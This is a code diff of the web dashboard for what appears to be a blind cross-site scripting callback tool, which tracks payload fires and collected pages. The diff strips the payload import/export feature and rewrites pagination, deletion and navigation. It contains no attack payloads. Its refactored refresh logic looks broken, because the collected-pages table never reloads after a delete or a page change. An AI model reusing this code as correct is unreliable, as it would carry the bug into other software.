-            payload_import_export_form.addEventListener('submit', function(event) {
-                event.preventDefault();
-                var status_div = make_div('status', payload_import_export_form);
-                var status = make_element('p', '', status_div);
-                var input = payload_import_export_form.getElementsByTagName('textarea')[0];
-                fetch('/api/v1/user_payload_importer', {
-                    method: 'POST',
-                    body: input.value
-                })
-                .then(() => {
-                    status.textContent = 'Payloads Imported';
-                    status.className = 'status_good';
-                });
-            });
-
-            make_element('hr', null, payload_import_export);
-
-            var payload_export_button = make_element('button', 'Export Payloads', payload_import_export, 'action_button', function() {
-                fetch('/api/v1/user_payloads', {
-                    method: 'GET',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                })
-                .then(response => response.json())
-                .then(data => {
-                    var exported_payloads = data.map(payload => {
-                        return {
-                            title: payload.title,
-                            description: payload.description,
-                            payload: payload.payload,
-                            author: payload.author,
-                            author_link: payload.author_link
-                        };
-                    });
-                    make_element('br', null, payload_import_export);
-                    make_element('code', JSON.stringify(exported_payloads), payload_import_export, 'exported_payloads', function() {
-                        copyToClipboard(JSON.stringify(exported_payloads));
-                    });
-                })
-            });
-        }
-        
-        function copyToClipboard(text) {
-            var textArea = document.createElement("textarea");
-            textArea.value = text;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textArea);
+        function refreshCollectedPages() {
+            loadCollectedPages();
         }
 
         function loadCollectedPages() {
-            if (state.collected_pages) {
-                return;
-            }
+            if (state.collected_pages) return;
             state.collected_pages = 1;
-
             fetch(`/api/v1/collected_pages?page=${state.collected_pages_page}`, {
                 method: 'GET',
                 headers: {
@@ -845,226 +328,58 @@
             })
             .then(response => response.json())
             .then(data => {
-                const table = document.getElementById('pagesTable');
+                const tableBody = document.querySelector('#pagesTable tbody');
+                tableBody.innerHTML = '';
                 data.forEach(item => {
-                    const row = table.insertRow();
-                    const idCell = row.insertCell();
-                    const uriCell = row.insertCell();
+                    const row = tableBody.insertRow();
+                    row.insertCell().textContent = item.id;
+                    row.insertCell().textContent = item.uri;
                     const actionCell = row.insertCell();
-
-                    idCell.textContent = item.id;
-                    uriCell.textContent = item.uri;
-
                     const deleteButton = document.createElement('button');
+                    deleteButton.className = 'btn btn-danger';
                     deleteButton.textContent = 'Delete';
-                    deleteButton.onclick = function() {
-                        deleteCollectedPage(item.id);
-                    };
+                    deleteButton.onclick = () => deleteCollectedPage(item.id);
                     actionCell.appendChild(deleteButton);
                 });
             });
         }
 
-        function refreshCollectedPages() {
-            const table = document.getElementById('pagesTable');
-            while (table.rows.length > 1) {
-                table.deleteRow(1);
-            }
-            state.collected_pages = 0;
-            loadCollectedPages();
-        }
-
         function changePageCollectedPages(pageIncrement) {
-            state.collected_pages += pageIncrement;
-            if (state.collected_pages == 1) {
-                state.collected_pages = 1;
-                const previousButton = document.getElementById('collected_pages_previous_button');
-                if (previousButton) {
-                    previousButton.remove();
-                }
-            } else {
-                const previousButtonOrigin = document.getElementById('collected_pages_previous_button');
-                if (!previousButtonOrigin) {
-                    const nextButton = document.getElementById('collected_pages_next_button');
-                    const previousButton = make_element('button', 'Previous Page', null, 'action_button', function() {
-                        changePageCollectedPages(-1);
-                    });
-                    previousButton.id = 'collected_pages_previous_button';
-
-                    nextButton.parentNode.insertBefore(previousButton, nextButton);
-                }
+            state.collected_pages_page += pageIncrement;
+            if (state.collected_pages_page < 1) {
+                state.collected_pages_page = 1;
             }
             refreshCollectedPages();
         }
 
         function deleteCollectedPage(id) {
-            var form_data = new FormData();
-            form_data.append("ids", id);
-
-            fetch('/api/v1/collected_pages', {
+            fetch(`/api/v1/collected_pages/${id}`, {
                 method: 'DELETE',
-                body: form_data
+                headers: {
+                    'Content-Type': 'application/json'
+                }
             })
-            .then(() => {
-                // Reload the page to get the updated list
-                location.reload();
-            });
+            .then(() => refreshCollectedPages());
         }
-
-        // Load the collected pages when the page loads
-        window.onload = start;
-        function start() {
-            loadVersion(true);
-            loadPayloadFires();
-        }
-    </script>
-
-    <script>
-        var state = {
-            payload_fires: 1,
-            collected_pages: 0,
-            settings: 0,
-            payloads: 0,
-            payload_maker: 0,
-            payload_import_export: 0,
-            settings_form: {},
-            payload_fires_page: 1,
-            collected_pages_page: 1
-        };
-
-
 
         function navbar(page) {
-            document.getElementById('payload_fires').style.display = 'none';
-            document.getElementById('collected_pages').style.display = 'none';
-            document.getElementById('settings').style.display = 'none';
-            document.getElementById('payloads').style.display = 'none';
-            document.getElementById('payload_maker').style.display = 'none';
-            document.getElementById('payload_import_export').style.display = 'none';
-
-            switch (page) {
-                case 'payload_fires':
-                    document.getElementById('payload_fires').style.display = 'flex';
-                    break;
-                case 'collected_pages':
-                    loadCollectedPages();
-                    document.getElementById('collected_pages').style.display = 'flex';
-                    break;
-                case 'settings':
-                    loadSettings();
-                    document.getElementById('settings').style.display = 'flex';
-                    break;
-                case 'payloads':
-                    makePayloadsTable();
-                    document.getElementById('payloads').style.display = 'flex';
-                    break;
-                case 'payload_maker':
-                    makePayloadMaker();
-                    document.getElementById('payload_maker').style.display = 'flex';
-                    break;
-                case 'payload_import_export':
-                    makePayloadImporterExporter();
-                    document.getElementById('payload_import_export').style.display = 'flex';
-                    break;
-                default:
-                    break;
-            }
+            document.querySelectorAll('.container').forEach(container => container.classList.add('d-none'));
+            document.getElementById(page).classList.remove('d-none');
+            if (page === 'payload_fires') loadPayloadFires();
+            if (page === 'collected_pages') loadCollectedPages();
+            if (page === 'settings') loadSettings();
         }
 
-        function make_element(tag, text = null, parent = null, style_class = null, onclick_function = null) {
-            var element = document.createElement(tag);
-            element.textContent = text;
-            if (style_class) {
-                element.className = style_class;
-            }
-            if (onclick_function) {
-                element.onclick = onclick_function;
-            }
-            if (parent) {
-                parent.appendChild(element);
-            }
-            return element;
-        }
+        const state = {
+            payload_fires_page: 1,
+            collected_pages_page: 1,
+            settings: 0,
+            collected_pages: 0
+        };
 
-        function make_image(src, alt, parent = null, style_class = null) {
-            var image = document.createElement('img');
-            image.src = `/screenshots/${src}.png`;
-            image.alt = alt;
-            if (style_class) {
-                image.className = style_class;
-            }
-            if (parent) {
-                parent.appendChild(image);
-            }
-            return image;
-        }
-
-        function make_modal(style_class) {
-            var modal = make_element('div', null, null, style_class);
-            return modal;
-        }
-
-        function make_modal_element(label_tag, item_tag, label, text = null, parent = null, div_style_class = 'modal_element_div', label_style_class = 'modal_element_label', item_style_class = 'modal_element_item', onclick_function = null) {
-            var parent_div = make_div(div_style_class, parent);
-            var div = make_element(label_tag, label, parent_div, label_style_class, onclick_function)
-            var element = make_element(item_tag, text, parent_div, item_style_class, onclick_function);
-            return element;
-        }
-
-        function make_div(style_class, parent = null) {
-            var div = make_element('div', null, parent, style_class);
-            return div;
-        }
-
-        function make_table(style_class, parent = null) {
-            var table = make_element('table', null, parent);
-            return table;
-        }
-
-        function make_table_row(table, style_class = null) {
-            var row = table.insertRow();
-            if (style_class) {
-                row.className = style_class;
-            }
-            return row;
-        }
-
-        function make_editable_table_cell(value, key, row, is_bool, style_class = null) {
-            var cell = row.insertCell();
-            var input = document.createElement('input');
-        
-            input.type = is_bool ? 'checkbox' : 'text';
-            if (is_bool) {
-                input.checked = value === 'true';
-            } else {
-                input.value = value;
-            }
-            input.id = key;
-            cell.appendChild(input);
-            if (style_class) {
-                cell.className = style_class;
-            }
-            return cell;
-        }
-
-        function make_settings_table_cell(row, key, value, style_class = null) {
-            var key_cell = make_table_cell(key, row, `${style_class} key_cell`);
-            var is_bool = key === 'SEND_ALERTS';
-            var value_cell = make_editable_table_cell(value, key, row, is_bool, `${style_class} value_cell`);
-        }
-
-        function make_table_cell(text, row, style_class = null) {
-            var cell = row.insertCell();
-            cell.textContent = text;
-            if (style_class) {
-                cell.className = style_class;
-            }
-            return cell;
-        }
-
-        function html_encode(value){
-            return String(value).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace( /=/g, '&#61;' ).replace( / /g, '&#32;' );
-        }
+        document.addEventListener('DOMContentLoaded', () => {
+            loadPayloadFires();
+        });
     </script>
 </body>
 </html>
